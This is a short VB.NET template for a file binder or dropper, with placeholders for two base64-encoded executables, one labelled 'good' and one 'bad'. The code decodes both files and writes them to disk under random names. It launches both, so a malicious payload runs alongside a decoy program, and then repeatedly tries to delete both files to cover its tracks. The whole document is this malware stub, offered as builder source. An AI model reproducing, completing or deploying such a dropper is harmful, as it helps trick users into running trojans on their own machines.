Module Module1
 Sub Main()

  Dim %GoodFileCodedBytes%  As String = %goodfile%
  Dim %BadFileCodedBytes%  As String = %badfile%
  Dim %GoodFileBytes%() As Byte = Convert.FromBase64String(%GoodFileCodedBytes%)
  Dim %BadFileBytes%() As Byte = Convert.FromBase64String(%BadFileCodedBytes%)
  Dim %GoodFileName% as string = "\" &amp; random_key(5) &amp; ".exe"
  Dim %BadFileName% as string =  "\" &amp; random_key(5) &amp; ".exe"
  IO.File.WriteAllBytes(Environment.CurrentDirectory &amp; %GoodFileName%, %GoodFileBytes%)
  IO.File.WriteAllBytes(Environment.CurrentDirectory &amp; %BadFileName%, %BadFileBytes%)
  Process.Start(Environment.CurrentDirectory &amp; %GoodFileName%)
  Process.Start(Environment.CurrentDirectory &amp; %BadFileName%)
        Do While IO.File.Exists(Environment.CurrentDirectory &amp; %GoodFileName%) And IO.File.Exists(Environment.CurrentDirectory &amp; %BadFileName%)
        Try
        IO.File.Delete(Environment.CurrentDirectory &amp; %GoodFileName%)
        IO.File.Delete(Environment.CurrentDirectory &amp; %BadFileName%)
        catch ex as exception
        end try
        Thread.Sleep(%SleeperValue%)
  Loop

    End Sub
    Public Function random_key(ByVal lenght As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
